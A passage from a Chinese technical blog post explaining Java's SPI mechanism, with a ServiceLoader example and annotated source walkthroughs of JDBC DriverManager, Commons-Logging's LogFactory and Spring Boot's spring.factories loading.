<li>当其他的程序需要这个服务的时候，就可以通过查找这个jar包（一般都是以jar包做依赖）的META-INF/services/中的配置文件，配置文件中有接口的具体实现类名，再根据这个类名进行加载实例化，就可以使用该服务了。JDK中查找服务的实现的工具类是：java.util.ServiceLoader。</li>
</ol>
<h2 data-id="heading-3">SPI机制的简单示例</h2>
<p>假设现在需要一个发送消息的服务MessageService，发送消息的实现可能是基于短信、也可能是基于电子邮件、或推送通知发送消息。</p>
<ul>
<li><strong>接口定义</strong>：首先定义一个接口 <code>MessageService</code></li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">MessageService</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMessage</span><span class="hljs-params">(String message)</span>;
}
</code></pre>
<ul>
<li><strong>提供两个实现类</strong>：一个通过短信发送消息，一个通过电子邮件发送消息。</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 短信发送实现</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsMessageService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MessageService</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMessage</span><span class="hljs-params">(String message)</span> {
        System.out.println(<span class="hljs-string">"Sending SMS: "</span> + message);
    }
}

<span class="hljs-comment">// 电子邮件发送实现</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmailMessageService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MessageService</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMessage</span><span class="hljs-params">(String message)</span> {
        System.out.println(<span class="hljs-string">"Sending Email: "</span> + message);
    }
}
</code></pre>
<ul>
<li><strong>配置文件</strong>：在 <code>META-INF/services/</code> 目录下创建一个配置文件，文件名为 <code>MessageService</code> ，全限定名 <code>com.example.MessageService</code>，文件内容为接口的实现类的全限定名。</li>
</ul>
<pre><code class="hljs language-java" lang="java"># 文件: META-INF/services/com.seven.MessageService
com.seven.SmsMessageService
com.seven.EmailMessageService
</code></pre>
<ul>
<li><strong>加载服务实现</strong>：在应用程序中，通过 <code>ServiceLoader</code> 动态加载并使用这些实现类。</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        ServiceLoader&lt;MessageService&gt; loader = ServiceLoader.load(MessageService.class);

        <span class="hljs-keyword">for</span> (MessageService service : loader) {
            service.sendMessage(<span class="hljs-string">"Hello, SPI!"</span>);
        }
    }
}
</code></pre>
<p>运行时，<code>ServiceLoader</code> 会发现并加载配置文件中列出的所有实现类，并依次调用它们的 <code>sendMessage</code> 方法。</p>
<p>由于在 配置文件 写了两个实现类，因此两个实现类都会执行 sendMessage 方法。</p>
<p>这就是因为ServiceLoader.load(Search.class)在加载某接口时，会去 META-INF/services 下找接口的全限定名文件，再根据里面的内容加载相应的实现类。</p>
<p>这就是spi的思想，接口的实现由provider实现，provider只用在提交的jar包里的META-INF/services下根据平台定义的接口新建文件，并添加进相应的实现类内容就好。</p>
<h2 data-id="heading-4">SPI机制的应用</h2>
<h3 data-id="heading-5">JDBC DriverManager</h3>
<p>在JDBC4.0之前，开发连接数据库的时候，通常会用<code>Class.forName("com.mysql.jdbc.Driver")</code>这句先加载数据库相关的驱动，然后再进行获取连接等的操作。而JDBC4.0之后不需要用<code>Class.forName("com.mysql.jdbc.Driver")</code>来加载驱动，直接获取连接就可以了，原因就是现在使用了Java的SPI扩展机制来实现。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c85677d74aaa4af5afa2748ef2c6484a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768889327&amp;x-signature=AeHC76Ms6Mgy2IMHayYaVHVnEUE%3D" alt="" loading="lazy"/></p>
<p>如上图所示：</p>
<ol>
<li>首先在java中定义了接口 java.sql.Driver，并没有具体的实现，具体的实现都是由不同厂商来提供的。</li>
<li>在mysql的jar包mysql-connector-java-8.0.26.jar中，可以找到 META-INF/services 目录，该目录下会有一个名字为 java.sql.Driver 的文件，文件内容是com.mysql.cj.jdbc.Driver，这里面的内容就是mysql针对Java中定义的接口的实现。</li>
<li>同样在ojdbc的jar包ojdbc11.jar中，也可以找到同样的配置文件，文件内容是 oracle.jdbc.OracleDriver，这是oracle数据库对Java的java.sql.Driver的实现。</li>
</ol>
<h4 data-id="heading-6">使用方法</h4>
<p>而现在Java中写连接数据库的代码的时候，不需要再使用<code>Class.forName("com.mysql.jdbc.Driver")</code>来加载驱动了，直接获取连接就可以了：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">"jdbc:xxxx://xxxx:xxxx/xxxx"</span>;
<span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(url, username, password);
.....
</code></pre>
<p>这里并没有涉及到spi的使用，看下面源码。</p>
<h4 data-id="heading-7">源码实现</h4>
<p>上面的使用方法，就是普通的连接数据库的代码，实际上并没有涉及到 SPI 的东西，但是有一点可以确定的是，我们没有写有关具体驱动的硬编码<code>Class.forName("com.mysql.jdbc.Driver")</code>！</p>
<p>而上面的代码就可以直接获取数据库连接进行操作，但是跟SPI有啥关系呢？
既然上面代码没有加载驱动的代码，那实际上是怎么去确定使用哪个数据库连接的驱动呢？</p>
<p>这里就涉及到使用Java的SPI 扩展机制来查找相关驱动的东西了，关于驱动的查找其实都在DriverManager中，DriverManager是Java中的实现，用来获取数据库连接，源码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DriverManager</span> {

    <span class="hljs-comment">// 存放注册的jdbc驱动</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> CopyOnWriteArrayList&lt;DriverInfo&gt; registeredDrivers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>&lt;&gt;();

    <span class="hljs-comment">/**
     * Load the initial JDBC drivers by checking the System property
     * jdbc.properties and then use the {<span class="hljs-doctag">@code</span> ServiceLoader} mechanism
     */</span>
    <span class="hljs-keyword">static</span> {
        loadInitialDrivers();
        println(<span class="hljs-string">"JDBC DriverManager initialized"</span>);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadInitialDrivers</span><span class="hljs-params">()</span> {
        String drivers;
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 从JVM -D参数读取jdbc驱动</span>
            drivers = AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;String&gt;() {
                <span class="hljs-keyword">public</span> String <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                    <span class="hljs-keyword">return</span> System.getProperty(<span class="hljs-string">"jdbc.drivers"</span>);
                }
            });
        } <span class="hljs-keyword">catch</span> (Exception ex) {
            drivers = <span class="hljs-literal">null</span>;
        }
        <span class="hljs-comment">// If the driver is packaged as a Service Provider, load it.</span>
        <span class="hljs-comment">// Get all the drivers through the classloader</span>
        <span class="hljs-comment">// exposed as a java.sql.Driver.class service.</span>
        <span class="hljs-comment">// ServiceLoader.load() replaces the sun.misc.Providers()</span>

        AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>&lt;Void&gt;() {
            <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {

                ServiceLoader&lt;Driver&gt; loadedDrivers = ServiceLoader.load(Driver.class);
                Iterator&lt;Driver&gt; driversIterator = loadedDrivers.iterator();

                <span class="hljs-comment">/* Load these drivers, so that they can be instantiated.
                 * It may be the case that the driver class may not be there
                 * i.e. there may be a packaged driver with the service class
                 * as implementation of java.sql.Driver but the actual class
                 * may be missing. In that case a java.util.ServiceConfigurationError
                 * will be thrown at runtime by the VM trying to locate
                 * and load the service.
                 *
                 * Adding a try catch block to catch those runtime errors
                 * if driver not available in classpath but it's
                 * packaged as service and that service is there in classpath.
                 */</span>
                <span class="hljs-keyword">try</span>{
                    <span class="hljs-comment">// 加载创建所有Driver</span>
                    <span class="hljs-keyword">while</span>(driversIterator.hasNext()) {
                        <span class="hljs-comment">// 触发Driver的类加载-&gt;在静态代码块中创建Driver对象并放到DriverManager</span>
                        driversIterator.next();
                    }
                } <span class="hljs-keyword">catch</span>(Throwable t) {
                <span class="hljs-comment">// Do nothing</span>
                }
                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
            }
        });

        println(<span class="hljs-string">"DriverManager.initialize: jdbc.drivers = "</span> + drivers);

        <span class="hljs-keyword">if</span> (drivers == <span class="hljs-literal">null</span> || drivers.equals(<span class="hljs-string">""</span>)) {
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-comment">// 解析JVM参数的jdbc驱动</span>
        String[] driversList = drivers.split(<span class="hljs-string">":"</span>);
        println(<span class="hljs-string">"number of Drivers:"</span> + driversList.length);
        <span class="hljs-keyword">for</span> (String aDriver : driversList) {
            <span class="hljs-keyword">try</span> {
                println(<span class="hljs-string">"DriverManager.Initialize: loading "</span> + aDriver);
                <span class="hljs-comment">// initial为ture </span>
                <span class="hljs-comment">// 触发Driver的类加载-&gt;在静态代码块中创建Driver对象并放到DriverManager</span>
                Class.forName(aDriver, <span class="hljs-literal">true</span>,
                        ClassLoader.getSystemClassLoader());
            } <span class="hljs-keyword">catch</span> (Exception ex) {
                println(<span class="hljs-string">"DriverManager.Initialize: load failed: "</span> + ex);
            }
        }
    }

}
</code></pre>
<p>上面的代码主要步骤是：</p>
<ol>
<li>从系统变量中获取有关驱动的定义。</li>
<li>使用SPI来获取驱动的实现。</li>
<li>遍历使用SPI获取到的具体实现，实例化各个实现类。</li>
<li>根据第一步获取到的驱动列表来实例化具体实现类。</li>
</ol>
<ul>
<li>第二步：使用SPI来获取驱动的实现，对应的代码是：</li>
</ul>
<pre><code class="hljs language-java" lang="java">ServiceLoader&lt;Driver&gt; loadedDrivers = ServiceLoader.load(Driver.class);
</code></pre>
<p>这里封装了接口类型和类加载器，并初始化了一个迭代器。</p>
<ul>
<li>第三步：遍历获取到的具体实现，实例化各个实现类，对应的代码如下：</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//获取迭代器</span>
Iterator&lt;Driver&gt; driversIterator = loadedDrivers.iterator();
<span class="hljs-comment">//遍历所有的驱动实现</span>
<span class="hljs-keyword">while</span>(driversIterator.hasNext()) {
    driversIterator.next();
}
</code></pre>
<p>在遍历的时候，首先调用driversIterator.hasNext()方法，这里会搜索classpath下以及jar包中所有的META-INF/services目录下的java.sql.Driver文件，并找到文件中的实现类的名字，此时并没有实例化具体的实现类（ServiceLoader具体的源码实现在下面）。</p>
<p>然后是调用driversIterator.next();方法，此时就会根据驱动名字具体实例化各个实现类了。现在驱动就被找到并实例化了。</p>
<h3 data-id="heading-8">Common-Logging</h3>
<p>common-logging（也称Jakarta Commons Logging，缩写 JCL）是常用的日志库门面， 使用了SPI的方式来动态加载和配置日志实现。这种机制允许库在运行时找到合适的日志实现，而无需硬编码具体的日志库。</p>
<p>我们看下它是怎么通过SPI解耦的。</p>
<p>首先，日志实例是通过LogFactory的getLog(String)方法创建的：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title function_">getLog</span><span class="hljs-params">(Class clazz)</span> <span class="hljs-keyword">throws</span> LogConfigurationException {
    <span class="hljs-keyword">return</span> getFactory().getInstance(clazz);
}
</code></pre>
<p>LogFatory是一个抽象类，它负责加载具体的日志实现，getFactory()方法源码如下：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> org.apache.commons.logging.LogFactory <span class="hljs-title function_">getFactory</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> LogConfigurationException {
    <span class="hljs-comment">// Identify the class loader we will be using</span>
    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">contextClassLoader</span> <span class="hljs-operator">=</span> getContextClassLoaderInternal();

    <span class="hljs-keyword">if</span> (contextClassLoader == <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// This is an odd enough situation to report about. This</span>
        <span class="hljs-comment">// output will be a nuisance on JDK1.1, as the system</span>
        <span class="hljs-comment">// classloader is null in that environment.</span>
        <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
            logDiagnostic(<span class="hljs-string">"Context classloader is null."</span>);
        }
    }

    <span class="hljs-comment">// Return any previously registered factory for this class loader</span>
    org.apache.commons.logging.<span class="hljs-type">LogFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> getCachedFactory(contextClassLoader);
    <span class="hljs-keyword">if</span> (factory != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> factory;
    }

    <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
        logDiagnostic(
                <span class="hljs-string">"[LOOKUP] LogFactory implementation requested for the first time for context classloader "</span> +
                        objectId(contextClassLoader));
        logHierarchy(<span class="hljs-string">"[LOOKUP] "</span>, contextClassLoader);
    }

    <span class="hljs-comment">// classpath根目录下寻找commons-logging.properties</span>
    <span class="hljs-type">Properties</span> <span class="hljs-variable">props</span> <span class="hljs-operator">=</span> getConfigurationFile(contextClassLoader, FACTORY_PROPERTIES);

    <span class="hljs-comment">// Determine whether we will be using the thread context class loader to</span>
    <span class="hljs-comment">// load logging classes or not by checking the loaded properties file (if any).</span>
    <span class="hljs-comment">// classpath根目录下commons-logging.properties是否配置use_tccl</span>
    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">baseClassLoader</span> <span class="hljs-operator">=</span> contextClassLoader;
    <span class="hljs-keyword">if</span> (props != <span class="hljs-literal">null</span>) {
        <span class="hljs-type">String</span> <span class="hljs-variable">useTCCLStr</span> <span class="hljs-operator">=</span> props.getProperty(TCCL_KEY);
        <span class="hljs-keyword">if</span> (useTCCLStr != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">if</span> (Boolean.valueOf(useTCCLStr).booleanValue() == <span class="hljs-literal">false</span>) {
                baseClassLoader = thisClassLoader;
            }
        }
    }

    <span class="hljs-comment">// 这里真正开始决定使用哪个factory</span>
    <span class="hljs-comment">// 首先，尝试查找vm系统属性org.apache.commons.logging.LogFactory，其是否指定factory</span>
    <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
        logDiagnostic(<span class="hljs-string">"[LOOKUP] Looking for system property ["</span> + FACTORY_PROPERTY +
                <span class="hljs-string">"] to define the LogFactory subclass to use..."</span>);
    }

    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">factoryClass</span> <span class="hljs-operator">=</span> getSystemProperty(FACTORY_PROPERTY, <span class="hljs-literal">null</span>);
        <span class="hljs-keyword">if</span> (factoryClass != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
                logDiagnostic(<span class="hljs-string">"[LOOKUP] Creating an instance of LogFactory class '"</span> + factoryClass +
                        <span class="hljs-string">"' as specified by system property "</span> + FACTORY_PROPERTY);
            }
            factory = newFactory(factoryClass, baseClassLoader, contextClassLoader);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
                logDiagnostic(<span class="hljs-string">"[LOOKUP] No system property ["</span> + FACTORY_PROPERTY + <span class="hljs-string">"] defined."</span>);
            }
        }
    } <span class="hljs-keyword">catch</span> (SecurityException e) {
        <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
            logDiagnostic(<span class="hljs-string">"[LOOKUP] A security exception occurred while trying to create an"</span> +
                    <span class="hljs-string">" instance of the custom factory class"</span> + <span class="hljs-string">": ["</span> + trim(e.getMessage()) +
                    <span class="hljs-string">"]. Trying alternative implementations..."</span>);
        }
        <span class="hljs-comment">// ignore</span>
    } <span class="hljs-keyword">catch</span> (RuntimeException e) {
        <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
            logDiagnostic(<span class="hljs-string">"[LOOKUP] An exception occurred while trying to create an"</span> +
                    <span class="hljs-string">" instance of the custom factory class"</span> + <span class="hljs-string">": ["</span> +
                    trim(e.getMessage()) +
                    <span class="hljs-string">"] as specified by a system property."</span>);
        }
        <span class="hljs-keyword">throw</span> e;
    }

    <span class="hljs-comment">// 第二，尝试使用java spi服务发现机制，在META-INF/services下寻找org.apache.commons.logging.LogFactory实现</span>
    <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
            logDiagnostic(<span class="hljs-string">"[LOOKUP] Looking for a resource file of name ["</span> + SERVICE_ID +
                    <span class="hljs-string">"] to define the LogFactory subclass to use..."</span>);
        }
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// META-INF/services/org.apache.commons.logging.LogFactory, SERVICE_ID</span>
            <span class="hljs-keyword">final</span> <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> getResourceAsStream(contextClassLoader, SERVICE_ID);

            <span class="hljs-keyword">if</span> (is != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// This code is needed by EBCDIC and other strange systems.</span>
                <span class="hljs-comment">// It's a fix for bugs reported in xerces</span>
                BufferedReader rd;
                <span class="hljs-keyword">try</span> {
                    rd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is, <span class="hljs-string">"UTF-8"</span>));
                } <span class="hljs-keyword">catch</span> (java.io.UnsupportedEncodingException e) {
                    rd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(is));
                }

                <span class="hljs-type">String</span> <span class="hljs-variable">factoryClassName</span> <span class="hljs-operator">=</span> rd.readLine();
                rd.close();

                <span class="hljs-keyword">if</span> (factoryClassName != <span class="hljs-literal">null</span> &amp;&amp; !<span class="hljs-string">""</span>.equals(factoryClassName)) {
                    <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
                        logDiagnostic(<span class="hljs-string">"[LOOKUP]  Creating an instance of LogFactory class "</span> +
                                factoryClassName +
                                <span class="hljs-string">" as specified by file '"</span> + SERVICE_ID +
                                <span class="hljs-string">"' which was present in the path of the context classloader."</span>);
                    }
                    factory = newFactory(factoryClassName, baseClassLoader, contextClassLoader);
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// is == null</span>
                <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
                    logDiagnostic(<span class="hljs-string">"[LOOKUP] No resource file with name '"</span> + SERVICE_ID + <span class="hljs-string">"' found."</span>);
                }
            }
        } <span class="hljs-keyword">catch</span> (Exception ex) {
            <span class="hljs-comment">// note: if the specified LogFactory class wasn't compatible with LogFactory</span>
            <span class="hljs-comment">// for some reason, a ClassCastException will be caught here, and attempts will</span>
            <span class="hljs-comment">// continue to find a compatible class.</span>
            <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
                logDiagnostic(
                        <span class="hljs-string">"[LOOKUP] A security exception occurred while trying to create an"</span> +
                                <span class="hljs-string">" instance of the custom factory class"</span> +
                                <span class="hljs-string">": ["</span> + trim(ex.getMessage()) +
                                <span class="hljs-string">"]. Trying alternative implementations..."</span>);
            }
            <span class="hljs-comment">// ignore</span>
        }
    }

    <span class="hljs-comment">// 第三，尝试从classpath根目录下的commons-logging.properties中查找org.apache.commons.logging.LogFactory属性指定的factory</span>
    <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">if</span> (props != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
                logDiagnostic(
                        <span class="hljs-string">"[LOOKUP] Looking in properties file for entry with key '"</span> + FACTORY_PROPERTY +
                                <span class="hljs-string">"' to define the LogFactory subclass to use..."</span>);
            }
            <span class="hljs-type">String</span> <span class="hljs-variable">factoryClass</span> <span class="hljs-operator">=</span> props.getProperty(FACTORY_PROPERTY);
            <span class="hljs-keyword">if</span> (factoryClass != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
                    logDiagnostic(
                            <span class="hljs-string">"[LOOKUP] Properties file specifies LogFactory subclass '"</span> + factoryClass + <span class="hljs-string">"'"</span>);
                }
                factory = newFactory(factoryClass, baseClassLoader, contextClassLoader);

                <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> think about whether we need to handle exceptions from newFactory</span>
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
                    logDiagnostic(<span class="hljs-string">"[LOOKUP] Properties file has no entry specifying LogFactory subclass."</span>);
                }
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
                logDiagnostic(<span class="hljs-string">"[LOOKUP] No properties file available to determine"</span> + <span class="hljs-string">" LogFactory subclass from.."</span>);
            }
        }
    }

    <span class="hljs-comment">// 最后，使用后备factory实现，org.apache.commons.logging.impl.LogFactoryImpl</span>
    <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">if</span> (isDiagnosticsEnabled()) {
            logDiagnostic(
                    <span class="hljs-string">"[LOOKUP] Loading the default LogFactory implementation '"</span> + FACTORY_DEFAULT +
                            <span class="hljs-string">"' via the same classloader that loaded this LogFactory"</span> +
                            <span class="hljs-string">" class (ie not looking in the context classloader)."</span>);
        }

        factory = newFactory(FACTORY_DEFAULT, thisClassLoader, contextClassLoader);
    }

    <span class="hljs-keyword">if</span> (factory != <span class="hljs-literal">null</span>) {
        cacheFactory(contextClassLoader, factory);

        <span class="hljs-keyword">if</span> (props != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">Enumeration</span> <span class="hljs-variable">names</span> <span class="hljs-operator">=</span> props.propertyNames();
            <span class="hljs-keyword">while</span> (names.hasMoreElements()) {
                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String) names.nextElement();
                <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> props.getProperty(name);
                factory.setAttribute(name, value);
            }
        }
    }

    <span class="hljs-keyword">return</span> factory;
}
</code></pre>
<p>可以看出，抽象类LogFactory加载具体实现的步骤如下：</p>
<ol>
<li>从vm系统属性org.apache.commons.logging.LogFactory</li>
<li>使用SPI服务发现机制，发现org.apache.commons.logging.LogFactory的实现</li>
<li>查找classpath根目录commons-logging.properties的org.apache.commons.logging.LogFactory属性是否指定factory实现</li>
<li>使用默认factory实现，org.apache.commons.logging.impl.LogFactoryImpl</li>
</ol>
<p>LogFactory的getLog()方法返回类型是org.apache.commons.logging.Log接口，提供了从trace到fatal方法。可以确定，如果日志实现提供者只要实现该接口，并且使用继承自org.apache.commons.logging.LogFactory的子类创建Log，必然可以构建一个松耦合的日志系统。</p>
<h3 data-id="heading-9">Spring中SPI机制</h3>
<p>在springboot的<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.seven97.top%2Fframework%2Fspringboot%2Fprincipleofautomaticassembly.html" target="_blank" title="https://www.seven97.top/framework/springboot/principleofautomaticassembly.html" ref="nofollow noopener noreferrer">自动装配</a>过程中，最终会加载META-INF/spring.factories文件，主要通过以下几个步骤实现：</p>
<ol>
<li><strong>服务接口定义</strong>： Spring 定义了许多服务接口，如 <code>org.springframework.boot.autoconfigure.EnableAutoConfiguration</code>。</li>
<li><strong>服务提供者实现</strong>： 各种具体的模块和库会提供这些服务接口的实现，如各种自动配置类。</li>
<li><strong>服务描述文件</strong>： 在实现模块的 JAR 包中，会有一个 <code>META-INF/spring.factories</code> 文件，这个文件中列出了该 JAR 包中实现的自动配置类。</li>
<li><strong>服务加载</strong>： Spring Boot 在启动时加载 <code>spring.factories</code> 文件，并实例化这些文件中列出的实现类。</li>
</ol>
<p>Spring Boot 使用 <code>SpringFactoriesLoader</code> 来加载 <code>spring.factories</code> 文件中列出的所有类，并将它们注册到应用上下文中。需要注意的是，其实这里不仅仅是会去ClassPath路径下查找，会扫描所有路径下的Jar包，只不过这个文件只会在Classpath下的jar包中。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FACTORIES_RESOURCE_LOCATION</span> <span class="hljs-operator">=</span> <span class="hljs-string">"META-INF/spring.factories"</span>;
<span class="hljs-comment">// spring.factories文件的格式为：key=value1,value2,value3</span>
<span class="hljs-comment">// 从所有的jar包中找到META-INF/spring.factories文件</span>
<span class="hljs-comment">// 然后从文件中解析出key=factoryClass类名称的所有value值</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">loadFactoryNames</span><span class="hljs-params">(Class&lt;?&gt; factoryClass, ClassLoader classLoader)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">factoryClassName</span> <span class="hljs-operator">=</span> factoryClass.getName();
    <span class="hljs-comment">// 取得资源文件的URL</span>
    Enumeration&lt;URL&gt; urls = (classLoader != <span class="hljs-literal">null</span> ? classLoader.getResources(FACTORIES_RESOURCE_LOCATION) : ClassLoader.getSystemResources(FACTORIES_RESOURCE_LOCATION));
    List&lt;String&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();
    <span class="hljs-comment">// 遍历所有的URL</span>
    <span class="hljs-keyword">while</span> (urls.hasMoreElements()) {
        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> urls.nextElement();
        <span class="hljs-comment">// 根据资源文件URL解析properties文件，得到对应的一组@Configuration类</span>
        <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> PropertiesLoaderUtils.loadProperties(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlResource</span>(url));
        <span class="hljs-type">String</span> <span class="hljs-variable">factoryClassNames</span> <span class="hljs-operator">=</span> properties.getProperty(factoryClassName);
        <span class="hljs-comment">// 组装数据，并返回</span>
        result.addAll(Arrays.asList(StringUtils.commaDelimitedListToStringArray(factoryClassNames)));
    }
    <span class="hljs-keyword">return</span> result;
}
</code></pre>
<p>通过 SPI 机制和 <code>spring.factories</code> 文件的配合，Spring Boot 实现了模块化和自动配置的能力。开发者可以通过定义自动配置类并在 <code>spring.factories</code> 文件中声明它们，从而实现模块的独立和松耦合。这种机制不仅简化了配置和启动过程，还提升了应用的可扩展性和维护性。</p>
<h2 data-id="heading-10">SPI 机制通常怎么使用</h2>
<p>看完上面的几个例子解析，应该都能知道大概的流程了：</p>
<ol>
<li>定义标准：定义标准，就是定义接口。比如接口java.sql.Driver</li>
<li>具体厂商或者框架开发者实现：厂商或者框架开发者开发具体的实现：
在META-INF/services目录下定义一个名字为接口全限定名的文件，比如java.sql.Driver文件，文件内容是具体的实现名字，比如me.cxis.sql.MyDriver。写具体的实现me.cxis.sql.MyDriver，都是对接口Driver的实现。</li>
<li>具体使用：引用具体厂商的jar包来实现我们的功能：</li>
</ol>
<pre><code class="hljs language-java" lang="java">ServiceLoader&lt;Driver&gt; loadedDrivers = ServiceLoader.load(Driver.class);
<span class="hljs-comment">//获取迭代器</span>
Iterator&lt;Driver&gt; driversIterator = loadedDrivers.iterator();
<span class="hljs-comment">//遍历</span>
<span class="hljs-keyword">while</span>(driversIterator.hasNext()) {
    driversIterator.next();
    <span class="hljs-comment">//可以做具体的业务逻辑</span>
}

</code></pre>
<ol start="4">
<li>使用规范：</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa43475fdb5949c2bb6227e0f44cb443~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2V2ZW5Db2Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768889327&amp;x-signature=%2BVEvjRf9%2BRJes4bO7%2BmIYdMvXAg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-11">SPI机制实现原理</h2>
